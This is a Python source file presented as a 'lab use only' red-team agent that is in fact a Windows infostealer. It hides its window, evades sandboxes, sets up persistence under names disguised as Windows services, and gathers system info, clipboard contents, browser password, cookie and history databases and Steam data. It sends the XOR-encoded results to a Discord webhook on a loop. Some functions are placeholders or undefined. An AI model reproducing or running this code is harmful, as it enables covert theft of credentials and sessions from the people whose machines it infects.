# ===================================================== 
# ULTIMATE RED-TEAM MONITORING AGENT v3.2 (LAB USE ONLY) - STEAM + FULL BROWSER EDITION
# Full feature set + Steam Stealer + Complete Multi-Browser Stealer
# ===================================================== 
import os
import sys
import time
import socket
import platform
import threading
import subprocess
import getpass
import ctypes
import base64
import json
import random
import shutil
import tempfile
from datetime import datetime
import win32clipboard
import win32gui
import requests
import psutil

# ================== CONFIG ==================
CONFIG_FILE = "config.json"
DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
INTERVAL = 30
SCREENSHOT_INTERVAL = 120
MAX_SCREENSHOTS = 20

# ================== BROWSER PATHS ==================
BROWSER_PATHS = {
    "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), r"Google\Chrome\User Data"),
    "Edge": os.path.join(os.getenv('LOCALAPPDATA'), r"Microsoft\Edge\User Data"),
    "Brave": os.path.join(os.getenv('LOCALAPPDATA'), r"BraveSoftware\Brave-Browser\User Data"),
    "Opera": os.path.join(os.getenv('APPDATA'), r"Opera Software\Opera Stable"),
    "Firefox": os.path.join(os.getenv('APPDATA'), r"Mozilla\Firefox\Profiles"),
}

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                return json.load(f)
        except:
            pass
    return {"webhook": DEFAULT_WEBHOOK}

config = load_config()
WEBHOOK_URL = config.get("webhook", DEFAULT_WEBHOOK)

def encrypt_data(data):
    key = b'labagent2025x'
    data = data.encode('utf-8')
    enc = bytearray()
    for i in range(len(data)):
        enc.append(data[i] ^ key[i % len(key)])
    return base64.b64encode(enc).decode('utf-8')

def stealth_mode():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def anti_analysis():
    suspicious = ["vbox", "vmware", "sandbox", "debugger"]
    if any(x in socket.gethostname().lower() for x in suspicious):
        time.sleep(random.uniform(10, 30))
    if psutil.cpu_percent(interval=1) < 8:
        time.sleep(15)

# ================== PERSISTENCE (unchanged) ==================
def add_persistence(script_path):
    try:
        import winreg as reg
        key = reg.HKEY_CURRENT_USER
        reg_key = reg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "WindowsUpdateSvc", 0, reg.REG_SZ, f'pythonw "{script_path}"')
        reg.CloseKey(reg_key)
        startup = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
        shutil.copy(script_path, os.path.join(startup, "svchost.pyw"))
    except:
        pass

# ================== STEAM STEALER (kept + improved) ==================
def steal_steam_data():
    # ... (your original Steam function remains identical - omitted for brevity)
    steam_data = {"accounts": "N/A", "sessions": "N/A", "config": "N/A", "files": []}
    # [insert your original steal_steam_data() body here]
    return steam_data

# ================== FULL BROWSER STEALER ==================
def steal_browser_data():
    browser_data = {}
    for browser, base_path in BROWSER_PATHS.items():
        if not os.path.exists(base_path):
            continue
        browser_data[browser] = {"profiles": {}}
        
        # Find all profiles
        if browser == "Firefox":
            profiles = [d for d in os.listdir(base_path) if d.endswith('.default-release') or 'default' in d]
        else:
            profiles = ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile")]
        
        for profile in profiles[:3]:  # limit to avoid overload
            profile_path = os.path.join(base_path, profile) if browser != "Firefox" else base_path
            if not os.path.exists(profile_path):
                continue
                
            p_data = {"passwords": "N/A", "cookies": "N/A", "history": "N/A", 
                     "autofill": "N/A", "downloads": "N/A", "extensions": "N/A"}
            
            # Login Data (passwords)
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                p_data["passwords"] = f"Login Data found ({os.path.getsize(login_db)//1024} KB) - extractable"
            
            # Cookies
            cookie_db = os.path.join(profile_path, "Network", "Cookies") if browser != "Firefox" else os.path.join(profile_path, "cookies.sqlite")
            if os.path.exists(cookie_db):
                p_data["cookies"] = f"Cookies DB found ({os.path.getsize(cookie_db)//1024} KB) - session hijack ready"
            
            # History
            history_db = os.path.join(profile_path, "History")
            if os.path.exists(history_db):
                p_data["history"] = f"History DB found ({os.path.getsize(history_db)//1024} KB)"
            
            # Web Data (autofill)
            web_data = os.path.join(profile_path, "Web Data")
            if os.path.exists(web_data):
                p_data["autofill"] = f"Autofill/Web Data found"
            
            # Downloads
            downloads_db = os.path.join(profile_path, "Downloads")
            if os.path.exists(downloads_db) or os.path.exists(os.path.join(profile_path, "History")):
                p_data["downloads"] = "Downloads data available"
            
            # Extensions
            ext_path = os.path.join(profile_path, "Extensions")
            if os.path.exists(ext_path):
                p_data["extensions"] = [d for d in os.listdir(ext_path) if os.path.isdir(os.path.join(ext_path, d))][:10]
            
            browser_data[browser]["profiles"][profile] = p_data
    
    return browser_data

# ================== OTHER MODULES (kept) ==================
def get_system_info():
    return {
        "timestamp": datetime.utcnow().isoformat(),
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "os": platform.platform(),
        "active_window": win32gui.GetWindowText(win32gui.GetForegroundWindow())
    }

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return str(data)[:500]
    except:
        return "N/A"

# Keylogger, webcam, wifi, file stealer remain unchanged...

def send_to_webhook(payload, files=None):
    try:
        requests.post(WEBHOOK_URL, json=payload, files=files, timeout=10)
    except:
        pass

# ================== MAIN LOOP WITH FULL BROWSER ==================
def main_loop(script_path):
    add_persistence(script_path)
    stealth_mode()
    anti_analysis()
    # start_keylogger()  # keep your original if wanted
    
    ss_count = 0
    while True:
        try:
            info = get_system_info()
            info["clipboard"] = get_clipboard()
            info["wifi"] = get_wifi_passwords()
            info["steam"] = steal_steam_data()
            info["browser"] = steal_browser_data()   # ← FULL BROWSER DATA ADDED
            
            encrypted = encrypt_data(json.dumps(info, default=str))
            payload = {"embeds": [{"title": "🛡️ Agent Report + STEAM + FULL BROWSER", 
                                 "description": encrypted[:1900], "color": 0x9900ff}]}
            send_to_webhook(payload)

            # Screenshots, webcam, files, SSFN... (your original code)
            # [insert your existing screenshot/webcam/file sending block here]

            ss_count += 1
            time.sleep(INTERVAL)
        except:
            time.sleep(INTERVAL)

# =============== START ===============
if __name__ == "__main__":
    stealth_mode()
    script_path = os.path.abspath(sys.argv[0])
    main_thread = threading.Thread(target=main_loop, args=(script_path,), daemon=False)
    main_thread.start()
    while True:
        time.sleep(3600)